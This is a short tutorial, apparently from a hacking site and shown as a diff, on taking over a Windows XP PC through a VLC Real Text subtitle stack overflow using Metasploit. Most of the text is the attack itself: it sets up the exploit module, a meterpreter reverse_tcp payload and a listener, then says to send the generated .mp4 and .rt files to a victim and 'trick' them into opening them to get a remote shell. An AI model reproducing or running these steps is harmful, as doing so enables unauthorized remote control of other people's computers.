@@ -1,0 +1,26 @@
+
+Hack Windows PC in Network using VLC Media Player Real Text Subtitle Overflow
+
+This module exploits a stack buffer overflow vulnerability in Video LAN VLC < 0.9.6. The vulnerability exists in the parsing of Real Text subtitle files. In order to exploit this, this module will generate two files: The .mp4 file is used to trick your victim into running. The .rt file is the actual malicious file that triggers the vulnerability, which should be placed under the same directory as the .mp4 file.
+VLC Media Player 0.9.6
+Windows XP SP 2
+Attacker: Backtrack 5
+Victim PC: Windows XP
+Open backtrack terminal type msfconsole
+
+Now type use exploit/windows/fileformat/vlc_realtext
+Msf exploit (vlc_realtext)>set payload windows/meterpreter/reverse_tcp
+Msf exploit (vlc_realtext)>set lhost 192.168.1.2 (IP of Local Host)
+Msf exploit (vlc_realtext)>exploit
+
+After we successfully generate the malicious MP4 File, it will stored on your local computer
+/root/.msf4/local/msf.mp4
+/root/.msf4/local/msf.rt
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.2
+exploit 
+Now send your msf.mp4 and msf.rt both files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
+
